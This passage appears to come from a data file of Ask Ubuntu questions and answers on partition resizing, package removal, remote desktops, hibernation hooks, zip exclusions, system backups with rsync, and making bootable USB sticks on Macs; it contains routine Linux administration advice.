can install CompizConfig and then enable the Scale Plugin.\n", "Q: Program for extending the filesystem? What program do you recommend me for extending the Ubuntu filesystem (the ext3 partition \"/\")? Except for gparted which has to boot from USB stick... is there any other software that I can try directly?\nThanks\n\nA: I do these things always manually using fdisk and resize2fs, however this is a little dangerous if you don't know what to do.\nThe steps would be as follows. You need to be root for that or use sudo in front of the commands. No guarantees for you data. Use at your own risk.\nFirst I recommend to make a backup of your data. Then backup the existing partition table in ASCII and binary form to a usbstick using:\nfdisk /dev/sda -lu > /media/usbstick/sda.txt\ndd if=/dev/sda of=/media/usbstick/sda.mbr count=1\n\nI assume here that your harddrive is called /dev/sda here.\nYou can then first resize your partition by removing it and recreating it bigger at the exact same position (!) as before. You need of course some space after the partition on your harddrive.\nfdisk -u /dev/sda\n\nEnter p followed by ENTER to print the existing partition table, remember the Start position of the partition. Delete it using d and the partition number and recreated it with n at the exact same start position. Write the table with w.\nThen use resize2fs /dev/sda1 (or whatever you partition number is) to resize the file system to the new partition size. This should work while the file system is mounted. An off-line resize is however more recommended.\n\nA: Resizing / is safe only with live cd. Use GParted or Ubuntu/Mint live CD. Linux Mint has GParted installed on live CD.\n\nA: If you are using LVM, then simply run lvextend to increase the size of the lv, then resize2fs to expand the fs to use the additional space.  If you are not using LVM, then it is not possible to do while the system is in use.\n", "Q: How to remove a package entirely? I'm quite new to Linux, but before using it I was hearing that Windows programs, after uninstallation, leaves a lot of remains on the hard disc, and Linux removes all.\nI'm using Ubuntu 10.04.

used sudo apt-get autoclean without any change. I've installed deborphan and it showed nothing (maybe I've used it in wrong way: just entered command deborphan). Am I doing something wrong or I was told something which is not true?\nI would like to know two things: how to remove packages (if I'm doing it in wrong way) and how to clean hard disc from remains of all packages I've uninstalled till now (even if I don't remember what it was exactly). I have Ubuntu Tweak installed but I don't know how to use it and I think I prefere terminal commnands.\nThanks\n\nA: apt-get autoclean will just remove old versions from the package archive, but won't change anything for installed packages.\nTo remove a package use sudo apt-get purge package.  This should uninstall any dependencies, but won't full remove them.  I use the command aptitude purge ~c to `.clean all uninstalled packages. \nEven purged packages may leave behind data files and backup files.  Backups should be a directory under in /var/backup.  Data files will likely be in /var/lib.  I would backup the data files before removing them in case some other application uses them.  You may want to grep the data file directory in /var/lib/dpkg/info.  If any files use the directory, then keep it.  For example to find which packages installed use /var/lib/ldap, I run the search grep -l /var/lib/ldap /var/lib/info/dpkg/*.  If you have a lots off packages you may need to use find /var/lib/dpkg/info | xargs grep -l /var/lib/ldap.\nEDIT: You can list all programs which could be marked as automatically installed with the command aptitude search '~i!~M?for x: ~D( ~i!~M )'.  Pipe this to the commands 'cut -d\\  -f4 | sudo aptitude markauto` to mark these packages as auto-installed.\nI then use the command aptitude search '~i!~M' (installed, not automatically installed) to list all the first order installed packages.  WARNING:  When removing packages, you may uninstall packages you want to keep.  Simulate the removal first, and unmarkauto any packages you want to keep before run the real removal.\nEDIT2: Above instructions includes packages suggested by other packages as first level packages.  To list these use the command aptitude search '~i!~M?for x: ~Rsuggests:( ~i!~M )'.  If desired, these can be marked using the same pipeline as for other dependencies.  However, you must configure suggested packages to be automatically installed, or all the suggested packages and their depencies will be automatically uninstalled.  This is done by adding the line APT::Install-Suggests \"true\"; to /etc/apt/apt.conf or a file in /etc/apt/apt.conf.d.\nDependencies may lead to unexpected selections for first level packages.  If neither wordpress is marked wordpress-l10n then wordpress-l10n is considered the first level install.  Normally wordpress-l10n would be marked as automatically installed, so this would not be a problem.  You will likely get a lot of cruft this way.\n\nA: You can use synaptic to do most of the stuff @BillThor have listed. \n", "Q: Is there a power-management like OpenSuse?

You can find it on https://launchpad.net/unity-jhbuild - but I can guarantee that it doesn't work in its current state - it will require you to fiddle with the unity.modules file and maybe employ a bit of dark magic - but it definitely can be made to work.\nThis of course all means you have to do a lot of compilation, which may not be what you are after. JHBuild eases the pain a little, but it's not as easy as a set of .debs :-)\n\nA: Hey, but you say you want to use Unity without going for unstable stuff.

I have a very powerful PC with Intel processor and a small Mac laptop with PowerPC processor. Both computers are with Ubuntu Linux. Mac laptop cannot play flash videos and I cannot install any Intel-CPU program on it (like Skype). So, it means I can install only open source applications on the laptop from Ubuntu repositories. I have two different Ubuntu system users on PC, say ME and SHE (and root as well :) ). \nIf I work as user ME on PC, then user SHE should also be able to access my PC remotely from her laptop and she should see a desktop of user SHE, not my desktop. She also must be able watch videos, flash, and listen sounds.\nIs it possible with Ubuntu? \n\nA: It's a little late to post this, but for anyone who comes across this thread:\nI use x2go for remote sessions with wound. It's based on the open sourced version of NXserver.\nNomachine also has released a free trial of their latest NXserver which is better in some ways and not in others. It's closed source however.\nUsing either program, you can then use a program called 'virtualgl' to run 3D accellerated apps inside your 2D remote session. I haven't found a way to use virtualgl to provide 3D acceleration for the desktop session, only individual applications launched within the session using 'vglrun'. \nYou can play 3D games over the network by starting them with vglrun, but I found that games run in wine don't work. :( You can run wine games via 'vglconnect' outside of x2go/Nomachine4, but unfortunately that doesn't have sound support, and I couldn't find any way of streaming sound, although I found a forum post outlining how that could be done, but it was over my head...\nGetting virtualgl to work for multiple user sessions is a bit of a pain too, because you have to make changes to your X-server configuration.\nThere are instructions on that here:\nhttp://www.virtualgl.org/vgldoc/2_1/#hd005002\nBut those are old, and it was fiddly because I had to remove lightdm and install GDM from memory, and I seem to recall my computer getting screwed up when I enabled auto-login with GDM set up in place of lightdm...\n\nA: Just remote desktop is trivial. However, sound and especially any video rendered using hardware is almost impossible to do.\nFor example TightVNC is excellent free remote desktop software. There is EsounD (remote sound daemon), but it's pretty old already. See also Wikipedia comparison table. FreeNX seems to be good candidate for remote desktop software with audio support.\nHowever, this is not going to help with dual audio (one for local and one for remote). That is possible (to route some programs to different sound card or different channel) but I couldn't find any good reference on that.\n", "Q: How to create a new file?

It should be\n#!/bin/bash\n\nfor bash scripts.  If the first line of your script is\n#!/bin/sh\n\nthen that would indicate that a strictly bourne-compatible shell is to be used; in the case of Ubuntu, dash is used.  In many other distributions, this does not cause a problem, because they link /bin/sh to /bin/bash; however ubuntu links to /bin/dash in order to allow system scripts to run more rapidly.\nThe declare builtin is one of bash's many extensions to the Bourne shell script specification; dash just implements that specification without extensions.\n\nA: I had the same issue, and then I remembered that you need to assign the right permissions to execute the shell script.\nChange permission of the script, for example:\nchmod 755 script.sh\n\n\nA: Try running your script using /bin/bash in command line instead if sh (:\nInstead of :\n\n    sh script.sh\n\nTry :\n\n    /bin/bash script.sh\n\n\nA: On Ubuntu, you may have a script which is executing other scripts within it, which I have run into.\nsome_dir/  \n        | main.sh  \n        | shhh.sh\n\n\n#!/bin/bash -e\n\necho \"file? $0\"\n# file? ./main.sh\n\necho \"shell? $SHELL\" \n# shell? /bin/bash\n\n# sh shhh.sh\n# file? shhh.sh\n# shell? /bin/bash\n# shhh.sh: 5: shhh.sh: declare: not found\n\n$SHELL shhh.sh\n# file? shhh.sh\n# shell? /bin/bash\n# foo? bar\n\n\n#!/bin/bash -e\n\necho \"file? $0\"\n# shhh.sh\n\necho \"shell? $SHELL\"\n# shell? /bin/bash\n\ndeclare foo=\"bar\"\n\necho \"foo? $foo\"\n\n\nChanging all sh some_script.sh to $SHELL some_script.sh fixed it.\n", "Q: Simultaneous remote connections Is there any package for Ubuntu which allows me to connect to remote computer without disturbing or terminating others who have already connected to that server or who are accessing the computer directly?. \nI remember I did this in Windows Server 2003 installing Terminal Server when I was doing my course which allowed multiple clients to connect to the server simultaneously with no disturbance to clients and even direct access to server.\nIs there any package like this for Ubuntu desktops?\n\nA: Yes.

If there is no solution, a work-around is welcome too.\n\nA: Triggers for hibernation:\n\n\n*\n\n*Press the Hibernate button in Kickoff -> Leave -> Hibernate\n\n*Press Hibernate on the Energy icon in the system tray\n\n*Send a dbus signal: qdbus org.kde.kded /modules/powerdevil suspend 4\nWhen hibernation is triggered, this is the execution flow:\n\n\n*\n\n*/usr/lib/hal/scripts/linux/hal-system-power-hibernate-linux is called\n\n*/usr/sbin/pm-hibernate is called with some arguments\n\n*Logging starts to /var/log/pm-suspend.log\n\n*Hooks are executed to prepare for hibernation. These hooks are located at /usr/lib/pm-utils/sleep.d/ and /etc/pm/sleep.d, and sorted by name (numbers first)\n\n*performing hibernate is written to the log\n\n*The shell function do_hibernate is called, instructing the system to hibernate\n\n*When the system resumes, hooks are executed to restore from hibernation\n\n*The system is running again\n\n\nTo disable hibernation, create /etc/pm/sleep.d/000no-hibernation with the next content:\n#!/bin/sh\n# prevents hibernation\n. \"$PM_FUNCTIONS\"\n[ \"$1\" = \"hibernate\" ] && inhibit || true\n\nAs 000no-hibernation is called before scripts like 00logging (outputs modules and memory info in the log), no applications or modules are interrupted or unloaded. This name was inspired by /usr/lib/pm-utils/sleep.d/000kernel-change. Beware of bug #665651 which makes non-zero return values of hooks fail to cancel suspend or hibernation.\nThis fixes the hibernation issue for me. Although the screen gets locked, I can live with this. It's much better compared to a crashing system.\n", "Q: Problem when update from 10.04 to 10.10 I select the normal release in update manager and synaptic->update.\nAfter i click the check button, it said that your system is up-to-date,\nand I cannot get the new package of the ubuntu 10.10.\nWhat 's the problem?\n\nA: To upgrade a long term support release (LTS) to a newer normal release of the distribution we need to select \"Normal releases\" in the settings dialogue of Update Manager as shown here:\n\n", "Q: Programs don't start after installing .deb packages I just installed a fresh copy of ubuntu destop 10.10 on my (old) Acer laptop.

How do I get the app menu to look like OSX? (Not the Global Menu, the menu items)\n\nI'm running Ubuntu 11.04 with the Classic Gnome desktop (not Unity).\n\nA: To get this little Mac menu, just follow these steps:\n\n\n*\n\n*Go up to your Menu bar or main menu and right click on it to bring up the context menu.\n\n*Click on Edit Menus and the menu editor should come up.\n\n*In the menu editor, on the right side, click the button that says \"New Menu\".

I remember a release when tracker was one of the innovations of Ubuntu. What happened to it?\n\nA: Metatracker, usually referred to as Tracker, was introduced in 8.04 (an LTS release), but removed, I believe, in 9.04.  I can only speculate as to why it was removed, but my guess would be multiple bugs, such as 100% CPU when the tracker daemon failed, or the slow start up on less powerful systems due to the indices updating.\nI run it on my system and haven't noticed any slow downs, but my laptop is reasonably powerful.\n", "Q: How to maintain document compatibility between LibreOffice and other office suites? When I save a document in LibreOffice and try to open it in Office 2007 for example, most or all of the paragraphs moved somehow. For what I found out is that the document has Widows and Orphans. How do I fix this so the document can be seen 100% accurate in Office 2007, 2003, OpenOffice and LibreOffice? What tips do askubuntu suggest about creating a compatible document between them (even though you know the non-standard approach of Office 2007 in this)?\n\nA: Personally, I have found that using the .doc file format in LibreOffice improves compatibility with MS office. \nAlso, install the newest service pack for Office 2007 because it will add .odt file format support to Office. Odt is the default format of LibreOffice and OpenOffice.\nI also know that using 1.5 line spacing sometimes lead to compatibility issues between Libreoffice and MS. \nFor Writer, go to options->LibreOffice Writer->compatibility and select the \"do not add leading space (extra space) between lines of text\" and the \"consider wrapping style when positioning objects.\"\nLastly, LibreOffice has much better support for MS office file formats than OpenOffice.\n\nA: One format almost 100% compatible between Ms Office and opensource applications is RTF. One issue is the files get bigger usually.\n\nA: It is almost impossible to have 100% compatibility, however, if you are not using wordart/libreoffice draw features, etc, you can get high levels of compatibility by using a few simple things:\n\n\n*\n\n*Save your documents in a format that all the listed office suites can use (MS Office 2003 documents are best for this purpose, and more so with Word Processing documents).\n\n*Only use features that are shared between the applications, so for example, use simple formatting in tables (by simple, I mean, just create a standard table, XY dimensions, without adding excel features etc, which can become complicated*).\n\n*Use fonts that are available in all the suites. Missing fonts can produce problems.\n\n*Use the program options to your advantage :)! I do not have office installed, but I do have LibreOffice. So for example, you can set up the Load/Save options as such:\n\nYou can access this dialog by clicking tools>options in the menu.\n\n\nA: If there is no need to edit the document in Microsoft Office, then creating a PDF format of the document will also help.\nTo create a PDF document, select \nFile -> Export as PDF\n\n", "Q: Cannot boot from Ubuntu USB I create a ubuntu 10.10 bootable USB via the method that is described on the download page of ubuntu.

How are the files in an Ubuntu repository organized? What are the important files in a repository? What happens when a repository becomes inconsistent, broken or is being synced?\n\nA: Joao answered the second half of my question, so I investigated the first half on my own. At the root level, there are four directories and one file.\nroot\n| -- dists\n| -- pool\n| -- indices\n| -- project\n| -- ls-lr.gz\n\n(Also in my college repo, only the first two entries were there. So the last 3 seem to be non-essential to the functioning of the repo.)\nThe file ls-lr.gz contains the output of the ls -lr command as run on the repository root directory. \nThe dists directory seems to contain most of the metadata, including all the packages.gz file (which contains a list of packages) and Release.gpg/Release which signs the package. (Thanks to Joao for the info)\nThe pool directory contains the actual .deb files. The organization is /pool/[section]/[letter]/[group]/packagename.deb. Thus the actual location of the python-subversion package is /pool/main/s/subversion/python-subversion_1.3.2-3ubuntu2%7edapper1_amd64.deb, because subversion is the group of the python-subversion package, and s is the first letter of subversion.\nThe projects directory seems to contain a few files detailing how the mirror was synced to the original repo. \nThe indices directory contains many files, most of them empty. The non-empty files seem to supply some extra metadata for packages.\n\nA: According to the deb line on your apt source, apt will fetch:\n\n\n*\n\n*http://archive.ubuntu.com/ubuntu/dists/release/Release\n\n*http://archive.ubuntu.com/ubuntu/dists/release/Release.gpg\n\n*http://archive.ubuntu.com/ubuntu/dists/maverick/COMPONENT/binary-ARCH/Packages.gz\nIt validates if the Release.gpg is a valid signature for the Release file, and if the Packages.gz contents matches the integrity checksum present on the Release file.  If there is a mismatch, a repository signature integrity failure is reported.\nThe package file name for the requested package is determined from the previously retrieved Packages.gz contents.  It is downloaded, and its content checksum must match the Packages.gz checksum content or an integrity failure is reported.\nYour last question is not about the mirror structure per se, it is about the mirror synchronization, which depends on the mirroring process.  It is possible to synchronize using a temporary location without breaking the archive integrity during synch. I am not sure if all Ubuntu mirrors do that.\n", "Q: Binfmt config not persisting after booting I have the binfmt kernel module set up so I can run .NET apps as if they were native binaries.  \nI have the /etc/rc.local file configured identically to this.\nIf I power down my computer or boot into Windows, when I come back to Ubuntu, I can't run .NET apps without calling Mono.  However, if I simply touch /etc/rc.local and restart, the binfmt configuration appears to kick in and I can run my .NET EXE's as I expect to.\nHow do I get my configuration to stick?\n\nA: binfmt formats are typically handled by binfmt-support package. When mono is installed in Ubuntu, it adds a cli format specification in /var/lib/binfmts/cli.\nbinfmt-support is configured to start automatically at boot. I'd suggest checking, that you have binfmt-support and mono-runtime packages in your system.\n", "Q: How to tweak Ubuntu running on an old PC? After getting some old, but fancy hardware from my friends, I want to setup a second PC running ubuntu. Due to the fact that the hardware is more than five years old, I'll have to tweak some things to work with acceptable speed.\nDoes anyone have some recommendations what do to?\nAnd yes, I need a graphical interface :)\n\nA: 380MB RAM is pretty low, but should be fine running a lightweight OS.\nIf you want to stick to an Ubuntu based distro, I recommend Lubuntu. It uses the LXQt desktop environment. Watch out when installing heavy packages; try to find an alternative. Firefox is known to take a lot of memory, if the browser provided with Lubuntu suffices, stick to that one.\nI'm using Lubuntu as portable distro on my USB flash drive, and it runs pretty smoothly. Xubuntu (Xfce DE) is a great option as well, but it’s not as light as Lubuntu.\n\nA: Try Lubuntu. It has LXDE, which requires less RAM as all the other DEs. Check this one: https://wiki.ubuntu.com/Lubuntu#System%20requirements\n\nA: My school's technology club uses, almost exclusively, six or seven year old Dell Optiplex computers (because they're what we have, and we don't have the money or resources to get new or better things). All of those computers are running 10.10 perfectly fine.\nWe don't have any tricks up our sleeves, we just did a basic install. Sure, they've been tweaked a little (they're using Nautilus Elementary instead of plain nautilus, and the Mint Menu + DockbarX instead of the default panels, but they're almost a vanilla 10.10 install).\nThus far, we've yet to have any problems with them. Last year we had them running 9.04 (a couple got an upgrade to 9.10, and one got an upgrade to 10.10). They all work fine. Before that, they were running Windows or various other distributions (we've even got some of the old disks). We've never had any problems with the \"old\" hardware.\nThe only difference between those computers and my own computer are that they're running 32-bit, and don't have all the applications I use.\n\nA: Try to get more RAM. There is nothing which can replace it. \nI have seen machines with 256 MB RAM and even 196, but it's not fun - you allways have to close something, pick smallest programs for a job and wait while swapping. \nIf you can't get more RAM, don't use OpenOffice.org or LibreOffice, but plain editors, maybe abiword. \nReplace Firefox/Thunderbird with opera. \nLubuntu sounds reasonable. \n\nA: I have been successful with Xubuntu. And knowing that it is an official project from Canonical makes me trust it better. \nOther option that you have is to use the old computer as a thin client with UbuntuLTSP\n\nA: Fast osses on low end hardware I used sucesfully:\nLubuntu -using it now on my 1600 mhz (2gb ram) Atom laptop.

I have started running rkhunter (a security monitoring tool) and I have finally managed to clear all of its warnings.\nNow, a cron job runs every day to monitor my machine.

I totally ruined my Ubuntu 10.10 Desktop x64 installation today. I've never been able to hibernate or suspend (not with my laptop, server or htpc), not even through this guide. So I read a post here on askubuntu.com that said that the proprietary drivers may be in the way for it to work.\nTherefore I removed my ATI-drivers, rebooted, then tried to hibernate the system. I got some error about \"blk_something_something didn't work, resubmitting1\". So I turned off the computer and then tried booting up. I see the ubuntu splash but after that I'm greeted with this screen:\n\nThe upper dot is the mouse pointer since I can move it with the mouse (I have ubuntu set to login automatically). I don't know how this happened.\nWhat can I do to fix this? I'm getting seriously irritated over how buggy ubuntu is, why doesn't even suspend/hibernate work (remember that I have 3 different systems where it fails)?\nSo what is the next step? I want to get into cli mode and reinstall the driver but since I'm relatively new to ubuntu I don't know how to get into a terminal without logging in first. And if I press shift during boot I can't get into grub either and try something from there.\nPlease come with all suggestions you can think of!\nThank you very much!\nedit: Can I use ubuntu on a usb to insert the driver I need - if that is the problem?\n\nA: Try pressing Ctrl-Alt-F1 to get into console mode, login in using your normal credentials.

I am annoyed by Courier New on different web sites (most notably, GitHub) and would like to replace it with another font (say, Liberation Mono). I would like the solution to work in all browsers (so not to be browser specific), and I wouldn't like to uninstall all MS core fonts (I like the others).\nAny ideas?\n\nA: I managed to do it following this article: http://en.gentoo-wiki.com/wiki/X.Org/Fonts\nJust created ~/.fonts.conf with following contents:\n<?xml version=\"1.0\"?>\n<!DOCTYPE fontconfig SYSTEM \"fonts.dtd\">\n\n<fontconfig>\n  <!-- Replace Courier with a better-looking font -->\n  <match target=\"pattern\" name=\"family\">\n    <test name=\"family\" qual=\"any\"><string>Courier New</string></test>\n    <edit name=\"family\" mode=\"assign\">\n      <string>Liberation Mono</string>\n    </edit>\n  </match>\n</fontconfig>\n\nand didn't even had to log out in order to make effective, just restarted Chromium.\n\nA: Your GNOME font settings are in System -> Preferences -> Appearance -> Fonts. There you can set which default fonts you want to use for different things (Application font is the only one I've found to affect web sites). The changes are immediate, but don't work on GitHub (probably because they have specified a font rather than leaving it to the system).\nTo override web site fonts, I don't think there's any setting to override for all browsers - You'll have to configure per browser, for example Edit -> Preferences -> Content -> Fonts & Colors -> Advanced -> Allow ... for Firefox.\n\nA: How about installing only required fonts from MS core fonts i.e downloading each fonts and configuring each browsers to your priority fonts ?\n", "Q: Use Evolution to back up Gmail \"Sent folder\" I want to retrieve (initially via POP) my Gmail account mails, but the idea is just to keep a backup of those mails.

I have an Ubuntu 10.04 Server installation with PHP 5.3.2 installed, I want to upgrade it to PHP 5.3.5. I'm led to believe that apt-get upgrade will only install security updates, we're on this LTS release and don't plan on updating our servers until 12.04, so it's pretty important for us to be able to update PHP.\nAny ideas?\nMany thanks.\n\nA: Then you'll most likely have to build from source. Head to http://php.net, download the sources and build your PHP version.\n\nA: If you want to keep current with the latest upstream version, you should compile PHP from source. That allows you to tweak your installation even more, take time for reading through the extensions page for customizing PHP. Running ./configure --help in the source folder shows you a list of options too.\nWhen compiling from source, it's strongly recommended to subscribe to the PHP announcements mailing list. Go to http://php.net/mailing-lists.php, check the radio button \"Normal\" at Announcements, fill your email address in the bottom form and press \"Subscribe\".\n\nA: Just install it from the source.

The Zend Server daemons are controlled via: /usr/local/zend/bin/zendctl.sh which is symlinked to /etc/init.d/zend-server. These can be turned on/off using a variation of update-rc.d zend-server defaults\nPS: If you try this, make sure you type \"CE\" for \"Community edition\" during apt-get install, otherwise it's not free (as in beer). \n\nA: Security patches will be back ported.

Your computer should be running a web server like Apache of any other server which can accept incoming requests. Even your handwritten server, it should be listening to an interface at a specific port.\nNow you need to forward that port on your router if you are behind NAT on your router.

You can always define a NFS share yourself.\n\nA: And (as suppliment to the other answers) SMB (at al) is an open, royalty free specification. Its origins might be in the depths of Redmond but thanks in part to the EU and in greater part to the fantastic work of the Samba project and its contributors, is a highly compatible simple sharing service that, when it works, just works.\nDon't get me wrong, NFS is great. It's faster and lighter than Samba... But try getting three different operating systems talking to each other over it.\nThere's also the issue of needing to be root to set NFS shares. Not an insurmountable issue in the scale of things but a low priority goal in the scope of the NFS project when Samba already does the job so well.\n", "Q: How do I zip up a folder but exclude the .git subfolder I'm trying to create a zip file from a folder and I'd like to exclude the .git sub-folder from the resulting zip file.\nI have gone to the parent folder of the one I want to zip (called bitvolution) and I'm doing:\nzip -r bitvolution.zip bitvolution -x \".git\"\n\nBut it doesn't exclude the .git sub-folder.\nI've tried various combinations, -x .git*, -x \\.git/*, -x .git/\\*, -x \\.git/\\*. I've also tried using the full path for the exclude argument... but just didn't get there.\n\nA: If you are using zsh, command should look like:\nzip -r target_name.zip source_dir -x '/*.git/*'\n\nIf you use: zip -r target_name.zip source_dir -x /*.git/*.\nwithout 'regex', zsh will process before zip run. You will get error message:\nzsh: no matches found: /*.git/*\n\n\nA: Use the following format if you want to ignore an entire folder.\nFor example, to ignore every node_modules folder, in every endpoint:\nzip -r API.zip API/* -x */node_modules/*\n\n\nA: Here's an example of what I use:\nzip -r workspace.zip workspace -x '*/.git/*' -x '*/.DS_Store/*' -x '*/build/*'\n\n\nA: The correct expression is -x '*.git*', so the full command should be:  \nzip -r bitvolution.zip ./bitvolution -x '*.git*'\n\nAn explanation from http://selfsolved.com/problems/zip-command-exclude-svn-director:\n\nThe correct incantation is\nzip -9 -r --exclude=*.svn*  foo.zip [directory-to-compress]\n\nYou can also add a\n--exclude=*.DS_Store* to exclude the annoying Mac OS X directory display metadata files.\nNotice that the expression passed to --exclude is using the entire original relative directory path as the original string to match against. So .svn/* by itself doesn't work; the wildcard character in front ensures that it matches .svn directories anywhere in the directory tree.\n\n\nA: I added backslash:\nzip -r bitvolution.zip bitvolution -x \\*.git\\*\n\nman page about backslash:\n\nThe backslash avoids the shell filename substitution, so that the name\n  matching is performed by zip at all directory levels.\n\n\nA: If you're trying to zip up a project which is stored in Git, use the git archive command. From within the source directory:\ngit archive -o bitvolution.zip HEAD\n\nYou can use any commit or tag ID instead of HEAD to archive the project at a certain point.\nIf you want to add a prefix (e.g., a top level folder) to every file:\ngit archive -o bitvolution.zip --prefix=bitvolution/ HEAD\n\nYou can also adjust the compression level between 0 (no compression) and 9 (maximum compression) inclusive, for example\ngit archive -o bitvolution.zip -9 HEAD\n\nFor other options, see the help page (git help archive).\n\nA: Assuming you have git installed on the machine you are doing this, you can also use git itself to create your archive.\ngit archive --format=zip HEAD -o bitvolution.zip\n\n\nA: another way is to use find , then exclude with grep -v\nfind . -type f|grep -v \"*.git\"|grep -v \"node_modules\"| zip myFIle.zip -@\n\nlooks easier for me, you might grep -v other strings you wan't to avoid.\nAnd if you're on windows , use busybox...\n", "Q: What is safe to exclude for a full system backup?

Also /bin and /sbin contains binaries from distribution packages.\n/usr/local contains manually installed packages (out of distribuition packages). so this is worth to backup.\n\nA: When I rsync my system to a backup partition, I exclude these:\n--exclude=/dev/* \\\n--exclude=/home/*/.gvfs \\\n--exclude=/home/*/.mozilla/firefox/*/Cache \\\n--exclude=/home/*/.cache/chromium \\\n--exclude=/home/*/.thumbnails \\\n--exclude=/media/* \\\n--exclude=/mnt/* \\\n--exclude=/proc/* \\\n--exclude=/sys/* \\\n--exclude=/tmp/* \\\n--exclude=/home/*/.local/share/Trash \\\n--exclude=/etc/fstab \\\n--exclude=/var/run/* \\\n--exclude=/var/lock/* \\\n--exclude=/lib/modules/*/volatile/.mounted \\\n--exclude=/var/cache/apt/archives/* \\\n\nThis way I am able to boot into the backup partition the same way I can boot to the original one. \nSo to sum up, I would suggest\n\n\n*\n\n*not excluding /{dev,proc,media,...} themselves, just their contents\n\n*excluding /var/{run,lock}, and especially the big /var/cache/apt/archives/\n\nA: I also read all of the answers and all the other related questions when I was configuring my full system backup.\nMy 2 cents would be not to exclude anything but only when you are doing a full system backup of an offline system. \nLet me elaborate now:\nIf you backing up the system from within itself, then you may exclude some directories as others have mentioned but this is not a good way in my opinion as it can introduce some bugs later on when restoring the system. For example, if you exclude /tmp directory, then after restoring it, /tmp won't be there and system will create one and this can have stuck login screens due to chmod & chown issues on /tmp. Also not backing up ~/.cache directory can result in breaking up database cache of Ubuntu Software Centre.\nWhat I do is use a live CD and use LuckyBackup and backup the entire system without omitting anything. Now when restoring, I chose 'delete files not present in the source'. This way you will have an entire system snapshot restored exactly to the state when you created the backup (kinda like snapshotting a VM).\n", "Q: How to make gvfs-smb always use UTF8 The problem is that if I make an entry in /etc/fstab to mount a samba share I can give the option iocharset=utf8 and this then mounts the share correctly and in the right encoding with special characters displayed correctly.\nGnomes automount system for some reason never gets this right and I can find nowhere to change its settings. \nIs there a way to make it always use UTF8 by default?\nThis is with Ubuntu 10.10 and the system can display the characters involved.\n\nA: gvfs-smb uses libsmbclient which uses the normal configuration for Samba for encoding.

I'm thinking of an investment in a new root server running ubuntu. Due to the fact, that the provider won't have extra backup-space, I need an other solution.\nIs it possible to download the server backups automatically when my desktop machine is connected to the internet and in idle state?\n\nA: Is your dekstop an Ubuntu (or other Linux) machine?\nI ask because if it were, and this were me, I'd write a simple script on the desktop that mounts (using sshfs) the server into the local filesystem (although this is probably not required)) and then uses rsync to create a backup of your data. Then I'd just set a cron-job on the desktop to run the backup. I'm doing it this way around (rather than having the server push a backup) because only the desktop knows when it's turned on. It seems silly to add another layer of logic when you could just have the desktop do all the heavy lifting.\nFor an efficient back-up system, you do also have to be conscious of what data you need to back up. There's usually little value in cloning the entire filesystem once a day because the most likely restore procedure will be a re-imaging that restores most of the system.\nMost occasions, it only makes sense to have a copy of your unique data (your websites and their databases or whatever you're running on the server), the /etc/ dir (to speed up reconfiguring the reimaged server) and a list of packages that were installed so you can do a bulk-apt-get-install.\nOf course, I'm not you and I imagine my servers are configured differently to yours so what data you need is ultimately up to you.\nTo get you started, a simple rsync command could be:\nrsync -avze ssh user@example.com:/data/ /local/backup/path/\n\nFor this to work transparently without ineraction, you'll want to set up ssh key auth which will bypass a password prompt but does raise a security issue (your dekstop user can log in without a password!).\nIf that's an issue, you could run a script on the server to create a backup .tar.gz and then create a new user who only has permission to get this one file. Then alter your desktop script to log in with this new backup user and grab the tar.\nOr you could have the desktop script promt you for the ssh password.

If you select \"USB\" and \"Mac\" on this download page, it gives a series of command line instructions to make a USB key which the MacBook will boot into Ubuntu from.\nI've followed them to the letter two or three times on different USB keys, and it doesn't work. There's a very great deal of technical discussion about EFI etc. but this set of instructions seems to suggest it should just work, but it doesn't.\nHelp?

Apple doesn't want you to boot an OS other than OS X off USB.  If your Mac has a working optical drive, use it.  It will save you pain.  If you have a newer Mac (64 bit), just remember to use the Mac iso(amd64+mac), not the regular amd64 iso.  (See this for an explanation of the difference)\nLonger answer:  (Ok, I lied above.)  You can, but \"it's complicated\".  One method that has worked for a number of people is to dd the bootable USB key to its own partition on your hard drive and then boot off that partition.  The basic method is explained nicely here.    \nThis doesn't always work, even on the same hardware.  In particular, if you have a MacBook Air, which doesn't have an optical drive, then the forums are filled with posts of trying the dd-to-a-partition trick and failing.  For MacBook Air owners, it is strongly advised to obtain a MacBook Air SuperDrive (no, a regular USB CD/DVD drive does not suffice) and then use that to install through the usual CD route (using the Mac iso for a 64 bit install).\nLastly, this USB method actually worked(!) to install 11.10 onto my MacBook Air 3,1 (late 2010 model).  However, I expect some modification is needed to work on other versions of the Air, not to mention other Macs.  \n\nA: How to create a bootable USB stick on OS X / macOS\n\n*\n\n*You will need:\n\n*\n\n*A 4GB or larger USB stick/flash drive\n\n*An Apple computer or laptop running macOS\n\n*An Ubuntu ISO file. See Download Ubuntu Desktop for download links.\n\n\n\n*To ensure maximum compatibility with Apple hardware, first blank and reformat the USB stick using Apple's \"Disk Utility\", but this step can be skipped if you intend to use the USB stick with only generic PC hardware.\n\n*\n\n*Launch Disk Utility from Applications -> Utilities or Spotlight search.\n\n\n*Insert your USB stick and observe the new device added to Disk Utility.\n\n\n*Select the USB stick device (you may need to enable the option View -> Show All Devices) and select Erase from the toolbar (or right-click menu).\n\n\n*Set the format to MS-DOS (FAT) and the scheme to GUID Partition Map.\n\n\n*Check you've chosen the correct device and click Erase.\n\nWarning: Disk Utility needs to be used with caution as selecting the wrong device or partition can result in data loss.\n\n\n*Install and run Etcher\nTo write the ISO file to the USB stick, use a free and open source application called Etcher. After downloading this and clicking to mount the package, Etcher can either be run in place or dragged into your Applications folder.\nBy default, recent versions of macOS block the running of applications from unidentified developers. To side-step this issue, enable App Store and identified developers in the Security & Privacy pane of System Preferences. If you are still warned against running the application, click Open Anyway in the same pane.\n\n\n\n*Etcher configuration\nEtcher will configure and write to your USB device in three stages, each of which needs to be selected in turn:\n\n*\n\n*Select image will open a file requester from which should navigate to and select the ISO file downloaded previously. By default, the ISO file will be in your Downloads folder.\n\n\n*Select drive, replaced by the name of your USB device if one is already attached, lets you select your target device. You will be warned if the storage space is too small for your selected ISO.\n\n\n*Flash! will activate when both the image and the drive have been selected. As with Disk Utility, Etcher needs low-level access to your storage hardware and will ask for your password after selection.\n         \n\n\n\n\n\n*Write to device\nAfter entering your password, Etcher will start writing the ISO file to your USB device.\nThe Flash stage of the process will show progress, writing speed and an estimated duration until completion. This will be followed by a validation stage that will ensure the contents of the USB device are identical to the source image.\nWhen everything has finished, Etcher will declare the process a success.\nCongratulations! You now have Ubuntu on a USB stick, bootable and ready to go.\n\nWarning: After the write process has completed, macOS may inform you that 'The disk you inserted was not readable by this computer'. Don't select Initialize. Instead, select Eject and remove the USB device.\n\n\n*Boot your Mac\nIf you 